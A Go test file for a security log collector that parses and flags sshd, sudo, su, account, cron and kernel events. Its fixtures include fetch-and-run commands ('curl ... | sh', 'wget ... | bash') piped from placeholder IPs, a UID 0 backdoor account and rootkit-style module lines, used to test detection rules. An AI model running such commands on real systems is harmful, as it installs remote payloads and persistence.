package collector

import (
	"strings"
	"testing"
)

func TestParseSSH(t *testing.T) {
	cases := []struct {
		msg  string
		want sshEvent
	}{
		{"Failed password for root from 203.0.113.50 port 50001 ssh2", sshEvent{Kind: "failed", Method: "password", User: "root", Addr: "203.0.113.50", Port: "50001"}},
		{"Failed password for invalid user admin from 203.0.113.50 port 51111 ssh2", sshEvent{Kind: "failed", Method: "password", User: "admin", Addr: "203.0.113.50", Port: "51111", Invalid: true}},
		{"Failed none for invalid user  from 2001:db8::7 port 2222 ssh2", sshEvent{Kind: "failed", Method: "none", User: "", Addr: "2001:db8::7", Port: "2222", Invalid: true}},
		{"Failed publickey for git from 198.51.100.4 port 6000 ssh2: RSA SHA256:x", sshEvent{Kind: "failed", Method: "publickey", User: "git", Addr: "198.51.100.4", Port: "6000"}},
		{"Invalid user oracle from 198.51.100.23 port 40022", sshEvent{Kind: "invalid", User: "oracle", Addr: "198.51.100.23", Port: "40022", Invalid: true}},
		{"Accepted publickey for deploy from 10.0.4.12 port 40100 ssh2: ED25519 SHA256:abc", sshEvent{Kind: "accepted", Method: "publickey", User: "deploy", Addr: "10.0.4.12", Port: "40100"}},
	}
	for _, c := range cases {
		got, ok := parseSSH(c.msg)
		if !ok || got != c.want {
			t.Errorf("%q:\n got  %+v\n want %+v", c.msg, got, c.want)
		}
	}
	if _, ok := parseSSH("Connection closed by 10.0.0.1 port 22 [preauth]"); ok {
		t.Error("an unrelated sshd line parsed")
	}
}

func TestJudgeSSH(t *testing.T) {
	ext := sshEvent{Kind: "accepted", Method: "password", User: "root", Addr: "203.0.113.50"}
	got := rulesOf(judgeSSHAccepted(ext, 13))
	if got["logon.ssh_bruteforce_success"].Severity != SevCritical || got["logon.ssh_external"].Severity != SevSuspect {
		t.Fatalf("brute force then external root password logon: %v", keys(got))
	}
	internal := sshEvent{Kind: "accepted", Method: "publickey", User: "deploy", Addr: "10.0.4.12"}
	if f := judgeSSHAccepted(internal, 0); len(f) != 0 {
		t.Errorf("internal key logon flagged: %+v", f)
	}
	if f := judgeSSHFailures("203.0.113.50", 9, []string{"root"}); f != nil {
		t.Error("below the threshold")
	}
	if f := judgeSSHFailures("10.1.1.1", 40, []string{"root", "admin"}); len(f) != 1 || !strings.Contains(f[0].Detail, "internal") {
		t.Errorf("internal brute force: %+v", f)
	}
}

func TestParseAndJudgeSudo(t *testing.T) {
	ev, ok := parseSudo("   alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'a ; curl -s http://198.51.100.7/i | sh'")
	if !ok || ev.User != "alice" || ev.RunAs != "root" || ev.TTY != "pts/0" || ev.PWD != "/tmp" ||
		ev.Command != "/bin/sh -c 'a ; curl -s http://198.51.100.7/i | sh'" {
		t.Fatalf("command with ' ; ' inside: %+v", ev)
	}
	if !hasRule(judgeSudo(ev), "exec.download_pipe_shell") {
		t.Error("fetch-and-run under sudo not flagged")
	}
	ev, ok = parseSudo("mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash")
	if !ok || ev.Reason != "user NOT in sudoers" || !hasRule(judgeSudo(ev), "privesc.sudo_denied") {
		t.Fatalf("denied: %+v", ev)
	}
	ev, _ = parseSudo("bob : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/id")
	if f := rulesOf(judgeSudo(ev)); f["privesc.sudo_auth_failure"].Severity != SevInfo {
		t.Errorf("auth failure: %v", keys(f))
	}
	ev, _ = parseSudo("alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update")
	if f := judgeSudo(ev); len(f) != 0 {
		t.Errorf("ordinary sudo flagged: %+v", f)
	}
	for _, m := range []string{"pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)", "alice : no command"} {
		if _, ok := parseSudo(m); ok {
			t.Errorf("%q parsed as a sudo command", m)
		}
	}
}

func TestParseSuAccountCronKernel(t *testing.T) {
	if ev, ok := parseSu("FAILED SU (to root) bob on pts/2"); !ok || ev.OK || ev.From != "bob" || len(judgeSu(ev)) != 1 {
		t.Errorf("failed su: %+v", ev)
	}
	if ev, ok := parseSu("Successful su for root by alice"); !ok || !ev.OK || judgeSu(ev) != nil {
		t.Errorf("successful su: %+v", ev)
	}

	acc := []struct {
		msg  string
		rule string
		sev  Severity
	}{
		{"new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0", "persistence.account_created", SevCritical},
		{"new user: name=bob, UID=1002, GID=1002, home=/home/bob, shell=/bin/bash, from=/dev/pts/0", "persistence.account_created", SevNotable},
		{"add 'bob' to group 'sudo'", "persistence.admin_group_add", SevSuspect},
		{"user bob added by root to group docker", "persistence.admin_group_add", SevSuspect},
		{"add 'bob' to group 'audio'", "", ""},
		{"pam_unix(passwd:chauthtok): password changed for root", "persistence.password_changed", SevNotable},
		{"password for 'carol' changed by 'root'", "", ""},
		{"delete user 'carol'", "", ""},
	}
	for _, c := range acc {
		ev, ok := parseAccount(c.msg)
		if !ok {
			t.Errorf("%q didn't parse", c.msg)
			continue
		}
		got := rulesOf(judgeAccount(ev))
		if c.rule == "" {
			if len(got) != 0 {
				t.Errorf("%q: unexpected %v", c.msg, keys(got))
			}
		} else if got[c.rule].Severity != c.sev {
			t.Errorf("%q: %s = %q, want %q", c.msg, c.rule, got[c.rule].Severity, c.sev)
		}
	}
	if _, ok := parseAccount("add 'bob' to shadow group 'sudo'"); ok {
		t.Error("the gshadow mirror line should be skipped")
	}

	if u, cmd, ok := parseCron("(root) CMD (wget -qO- http://198.51.100.9/u.sh | bash)"); !ok || u != "root" || cmd != "wget -qO- http://198.51.100.9/u.sh | bash" {
		t.Errorf("cron: %q %q", u, cmd)
	}

	k, ok := parseKernel(jlog{Ident: "evilmod", Transport: "kernel", Message: "module verification failed: signature and/or required key missing - tainting kernel"})
	if !ok || k.Module != "evilmod" || judgeKernel(k)[0].Rule != "persistence.kmod_unsigned_loaded" {
		t.Errorf("unsigned module (identifier split off by journald): %+v", k)
	}
	k, _ = parseKernel(jlog{Ident: "kernel", Message: "rootkit: module verification failed: signature and/or required key missing - tainting kernel"})
	if k.Module != "rootkit" {
		t.Errorf("unsigned module (prefix in the message): %+v", k)
	}
	k, ok = parseKernel(jlog{Transport: "kernel", Message: "sshhide[777] is installing a program with bpf_probe_write_user helper that may corrupt user memory!"})
	if !ok || k.Comm != "sshhide" || k.PID != "777" || judgeKernel(k)[0].Severity != SevSuspect {
		t.Errorf("bpf write user: %+v", k)
	}
}
